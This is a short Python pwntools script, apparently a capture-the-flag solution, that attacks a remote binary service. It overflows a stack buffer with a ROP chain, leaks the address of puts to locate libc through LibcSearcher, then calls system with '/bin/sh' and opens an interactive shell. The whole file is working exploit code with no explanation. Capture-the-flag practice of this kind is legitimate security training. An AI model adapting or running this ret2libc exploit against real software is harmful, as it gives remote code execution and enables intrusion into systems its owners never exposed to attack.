from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')
p=remote("node5.anna.nssctf.cn",28567)
elf=ELF('./pwn')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
rdi_addr=0x0000000000400c83
main_addr=0x4009A0
ret_addr=0x4006B9
encrypt_addr = 0x4009A0
pop_rdi_ret = 0x0000000000400c83

p.sendlineafter("Input your choice!",b'1')

# payload=flat([b'a'*(0x50+8),rdi_addr,puts_got,puts_plt,main_addr])
payload = cyclic(0x50+8) + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter("Input your Plaintext to be encrypted\n",payload)
leak_puts=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.success(hex(leak_puts))

obj=LibcSearcher('puts',leak_puts)
libc_base=leak_puts-obj.dump("puts")
sys_addr=libc_base+obj.dump("system")
sh_addr=libc_base+obj.dump("str_bin_sh")
payload =b'a' * (0x50 + 0x8) + p64(pop_rdi_ret) + p64(sh_addr) + p64(ret_addr) + p64(sys_addr)

# payload=flat([cyclic(0x50+8),ret_addr,rdi_addr,sh_addr,sys_addr,0])
p.sendlineafter("Input your Plaintext to be encrypted",payload)
p.interactive()

